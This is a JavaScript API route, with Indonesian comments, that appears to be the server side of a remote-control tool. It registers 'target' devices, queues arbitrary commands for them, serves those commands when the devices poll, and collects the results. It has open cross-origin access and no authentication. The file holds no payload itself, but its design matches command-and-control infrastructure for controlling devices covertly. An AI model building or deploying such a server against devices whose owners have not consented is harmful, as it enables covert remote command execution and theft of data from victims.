import fs from 'fs';
import path from 'path';

const DATA_FILE = path.join(process.cwd(), 'data.json');

// Baca data dari file
function readData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    }
  } catch (e) {}
  return { devices: {}, commands: {}, results: {} };
}

// Tulis data ke file
function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { targetId, action, cmdId } = req.query;
  const body = req.body || {};
  const data = readData();

  // ============================================================
  // REGISTER DEVICE
  // ============================================================
  if (req.method === 'POST' && action === 'register') {
    const { battery, ua } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });

    data.devices[targetId] = {
      online: true,
      battery: battery || 0,
      lastSeen: Date.now(),
      ua: ua || 'Unknown'
    };
    writeData(data);
    return res.json({ status: 'registered' });
  }

  // ============================================================
  // GET ALL DEVICES
  // ============================================================
  if (req.method === 'GET' && action === 'devices') {
    const now = Date.now();
    const list = [];
    for (const [id, device] of Object.entries(data.devices || {})) {
      const online = (now - device.lastSeen) < 15000;
      list.push({
        id,
        online,
        battery: device.battery || 0,
        lastSeen: device.lastSeen,
        ua: device.ua || 'Unknown'
      });
    }
    return res.json({ devices: list });
  }

  // ============================================================
  // SEND COMMAND
  // ============================================================
  if (req.method === 'POST' && action === 'send') {
    const command = body.command;
    if (!targetId || !command) return res.status(400).json({ error: 'Missing data' });

    const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    if (!data.commands[targetId]) data.commands[targetId] = [];
    data.commands[targetId].push({ id, command });
    writeData(data);
    return res.json({ status: 'queued', id });
  }

  // ============================================================
  // POLL COMMAND
  // ============================================================
  if (req.method === 'GET' && action === 'poll') {
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });

    // Update last seen
    if (data.devices[targetId]) {
      data.devices[targetId].lastSeen = Date.now();
      data.devices[targetId].online = true;
      writeData(data);
    }

    const commands = data.commands[targetId] || [];
    const command = commands.shift();
    if (command) {
      writeData(data);
      return res.json({ command: command.command, id: command.id });
    }
    return res.json({ command: null });
  }

  // ============================================================
  // SEND RESULT
  // ============================================================
  if (req.method === 'POST' && action === 'result') {
    const { id, result } = body;
    if (!targetId || !id) return res.status(400).json({ error: 'Missing data' });
    if (!data.results[targetId]) data.results[targetId] = [];
    data.results[targetId].push({ id, result });
    writeData(data);
    return res.json({ status: 'received' });
  }

  // ============================================================
  // GET RESULT
  // ============================================================
  if (req.method === 'GET' && action === 'getResult') {
    if (!targetId || !cmdId) return res.status(400).json({ error: 'Missing data' });
    const results = data.results[targetId] || [];
    const idx = results.findIndex(r => r.id === cmdId);
    if (idx !== -1) {
      const result = results[idx].result;
      results.splice(idx, 1);
      writeData(data);
      return res.json({ result });
    }
    return res.json({ result: null });
  }

  // ============================================================
  // UPDATE BATTERY
  // ============================================================
  if (req.method === 'POST' && action === 'battery') {
    const { battery } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    if (data.devices[targetId]) {
      data.devices[targetId].battery = battery;
      data.devices[targetId].lastSeen = Date.now();
      writeData(data);
    }
    return res.json({ status: 'ok' });
  }

  return res.status(404).json({ error: 'Invalid route' });
}
